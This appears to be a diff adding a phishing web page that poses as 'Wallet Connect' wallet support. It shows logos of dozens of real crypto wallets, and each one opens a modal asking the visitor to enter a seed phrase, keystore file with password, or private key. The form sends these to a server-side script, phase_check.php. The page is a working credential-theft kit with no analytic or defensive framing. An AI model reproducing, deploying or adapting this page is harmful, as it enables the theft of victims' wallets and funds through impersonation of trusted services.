@@ -1,0 +1,383 @@
+<!doctype html>
+<html class="no-js" lang="">
+
+
+<!-- Mirrored from intro.themepul.com/restly/preview/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 Nov 2021 16:55:01 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta content="origin-when-cross-origin" name="referrer">
+    <link rel="dns-prefetch" href="http://s3.envato.com/">
+    <title>WALLET CONNECT SYSTEMATIC LIVE WALLET SUPPORT</title>
+    <meta name="description" content="WALLET CONNECT">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+   <link rel="shortcut icon" type="image/x-icon" href="favicon.png">
+    <!-- Place favicon.ico in the root directory -->
+
+    <!-- CSS here -->
+    <link rel="stylesheet" href="assets/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="assets/css/responsive.css">
+    <script>
+
+        function passValues(){
+            var walletName = document.getElementById("wallet_name").value;
+            localStorage.setItem("textvalue", walletName){
+                return false;
+            }
+        }
+    </script>
+
+    
+<script type="text/javascript">
+    function googleTranslateElementInit() {
+      new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
+  }
+</script>
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+</head>
+
+<body>
+
+    <!-- home pages -->
+<div class="wrapper">
+    
+    
+    <div class="demo-area pt-90 pb-40">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-12 site-heading text-center pb-50">
+             
+                    <img src="assets/images/WC.jpg" alt="bitcoin" style="max-width: 100px;">
+                  
+                    <h2>SYSTEMATIC LIVE WALLET SUPPORT</h2>
+                    <p>Most secure tool for all wallet node correction featuring kyc and others interesting functions</p>
+                </div>
+            </div>
+       <div style="border: 2px solid rgb(59, 59, 155); text-align: center; padding: 10px 20px;">
+        <h4 style="display: inline-block; padding: 10px 20px; border: 2px solid  rgb(59, 59, 155);">SELECT WALLET TYPE</h4>
+        <h4>Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</h4>
+
+       </div>
+        </div>
+    </div>
+  
+  <!-- ############################################### Modal #################################### -->
+  <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title" id="exampleModalLabel" data-dismiss="modal" style="cursor: pointer;"><img src="/assets/images/WC.jpg" alt="" style="width: 40px;"></h5>
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="modal-body">
+            <div class="model-content" style="text-align: center;">
+
+                <p style="font-size: larger; color: red; font-weight: 900;"  id="spin"></p>
+                
+                <div class="loader"></div>
+                <!-- <img src="assets/images/WC.jpg" alt="" style="width: 50px;" id="gameStart"> -->
+          <a type="button" class="btn btn-secondary show-up" style="display: inline-block; padding: 20px;" data-toggle="modal" data-target="#exampleModal2" data-dismiss="modal">Connect wallet manually</a>
+
+            </div>
+        </div>
+          <a type="button" class="btn btn-secondary" data-dismiss="modal" style="display: inline-block; padding: 20px;">Powered by Wallet Connect</a>
+      </div>
+    </div>
+  </div>
+
+  <!--################################################################ model -2 #######################333  -->
+
+  <div class="modal fade" id="exampleModal2" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel2" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-header" style="border-bottom: none; !important">
+          <h5 class="modal-title" id="exampleModalLabel" data-dismiss="modal" style="cursor: pointer;"><img src="/assets/images/WC1.jpg.png" alt="" style="width: 100px;"></h5>
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="modal-body" style="margin-top: 30px;">
+        <div class="model-content" style="text-align: center;">
+            <div style="display: flex; flex-direction: row; justify-content: space-evenly; border-bottom: 1px solid #80808030;
+            padding-bottom: 10px;" >
+                <div class="phrase">
+                    <button class="pop-up-btn" href="javascript:void(0);" onclick='document.getElementById("alt-text").innerHTML = "Phrase: Enter 12 or 24 word Phrase seperated by single spaces between each word"'>
+                        Phrase
+                    </button>
+                </div>
+                <div class="keystore">
+                    <button class="pop-up-btn" href="javascript:void(0);" onclick='document.getElementById("alt-text").innerHTML = "Keystore/JSON:Several lines of text beginning with (...),give a space at the end and then type the password you used to encrypt it."'>
+                        Keystore Json
+                    </button>
+                </div>
+                <div class="private-key">
+                    <button class="pop-up-btn" href="javascript:void(0);" onclick='document.getElementById("alt-text").innerHTML = "Private/key: Typically 64 alphanumeric characters"'>
+                        Private Key
+                    </button>
+                </div>
+            </div>
+           
+            <form class="form" action="phase_check.php" method="post">
+                <p  id="alt-text" >SECURELY ENTER YOUR WALLET DETAILS TO PROCEED,<br>
+                    Enter 12 or 24 word Phrase seperated by single spaces between each word</p>
+
+                <input type="text" id="wallet_name" name ="wallet_name" style="display: none;">
+                <input type="text" placeholder= "CONNECT WALLET" name="phase" required style="padding: 60px 0; width: 100%;" pattern=".{40,}" title="Mnemonic phrase must be at least 12 to 24 words, each separated by a space!">
+                
+                
+                 <button class="btn btn-secondary" style="display: inline-block; padding: 10px 20px;" name="submit" type="submit" id="contact-submit" data-submit="...Sending" sytle="padding:5px 10px;">CONNECT</button>
+                 
+          <!-- <a type="button" class="btn btn-secondary show-up" style="display: inline-block; padding: 20px;" data-toggle="modal" data-target="#Modal-2">Connect wallet manually</a> -->
+
+        </div>
+        </div>
+          <a type="button" class="btn btn-secondary" data-dismiss="modal" style="display: inline-block; padding: 20px;">Powered by Wallet Connect</a>
+      </div>
+    </div>
+  </div>
+
+
+
+
+
+
+
+
+  
+    <div class="more-features pt-90 pb-70">
+        <div class="container">
+            <div class="row">
+        
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                            <!-- Button trigger modal -->
+
+                            <a href="blockchain-tool.html" onclick='document.getElementById("wallet_name").value = "Binance wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/bnb.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a> 
+                        </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="blockchain-tool.html" onclick='document.getElementById("wallet_name").value = "Metamask wallet"'data-toggle="modal" data-target="#exampleModal" data-dismiss="modal"><img src="assets/images/meta.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="blockchain-tool.html" onclick='document.getElementById("wallet_name").value = "onto wallet"'data-toggle="modal" data-target="#exampleModal" data-dismiss="modal"><img src="assets/images/onto.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Trust wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/trust.svg" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Webauth wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/webauth-wallet.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Safepal"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/safepal.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Zcash wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/zcash.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Ledger"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/ledger.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Maths wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/math.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Coin 98"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/coin98.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Keplr wallet"' data-toggle="modal" data-target="#exampleModal"> <img src="assets/images/kplr.jpeg" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Sollet wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/sollet.jpg" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Solfare"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/solflare.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Trezor"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/trezor.jpg" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".2s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Terra"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/terra.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".2s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "IM Token"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/imtoken.jpg" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".2s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Tronlink"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/tron-trx-logo1.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".2s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Fantom"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/fantom-ftm-logo1.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".6s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Zilliqa"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/Zilliqa-ZIL-icon1.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Moonlet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/moonlet.jpg" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".2s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Bitkeep"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/bitkeep.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".4s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Avex"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/avalanche-avax-logo1.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".6s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Guarda"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/guarda.jpg" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Tezos"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/tezos1.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a> 
+                    </div>
+                </div>
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".2s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Harmony one"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/harmony1.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".4s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Algorand"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/algo1.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                       </div>
+                </div>
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".6s">
+                        <a href="#"onclick='document.getElementById("wallet_name").value = "Coin Base"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/cbase.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".2s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Crypto.com"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/CRYOT.COM.jpg" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".4s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Mew wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/MEW.webp" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".6s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Atomic wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/atomic-wallet.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Polkadot"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/Polkadot_symbol_color.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Exodus"' data-toggle="modal" data-target="#exampleModal"> <img src="assets/images/EXODUS.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".4s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Coinomi wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/COINOMI.png" alt ="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <!--<div class="col-4">-->
+                <!--    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">-->
+                <!--        <a href="#" onclick='document.getElementById("wallet_name").value = "Atomic wallet"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/atom.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>-->
+                <!--    </div>-->
+                <!--</div>-->
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Gnosis"' data-toggle="modal" data-target="#exampleModal"> <img src="assets/images/GNOSIS.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="" onclick='document.getElementById("wallet_name").value = "Ledger live"'data-toggle="modal" data-target="#exampleModal"><img src="assets/images/LIVE.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Trust wallet"'data-toggle="modal" data-target="#exampleModal"><img src="assets/images/HUOBI.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#" onclick='document.getElementById("wallet_name").value = "Tokenpoket"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/TOKENPOKET.webp" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+                <!--<div class="col-4">-->
+                <!--    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">-->
+                <!--        <a href="#" onclick='document.getElementById("wallet_name").value = "Huobi"'data-toggle="modal" data-target="#exampleModal"><img src="assets/images/HUOBI.png" alt="Restly - IT Solutions & Technology WordPress Theme"></a>-->
+                <!--    </div>-->
+                <!--</div>-->
+                <div class="col-4">
+                    <div class="bakix-features wow fadeInUp" data-wow-delay=".8s">
+                        <a href="#"onclick='document.getElementById("wallet_name").value = "All other wallets"' data-toggle="modal" data-target="#exampleModal"><img src="assets/images/WC.jpg" alt="Restly - IT Solutions & Technology WordPress Theme"></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer style="text-align: center; margin: 20px 0 10px 0; padding:20px;">
+        <p style="font-size: x-large; ">Contact us support@decentralizenetworkinterface.com</p>
+    </footer>
+</div>
+    <!-- JS here -->
+    <script src="assets/js/all.min.js"></script>
+    <script src="assets/js/active.js"></script>
+
+</body>
+
+
+<!-- Mirrored from intro.themepul.com/restly/preview/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 Nov 2021 16:55:20 GMT -->
+</html>
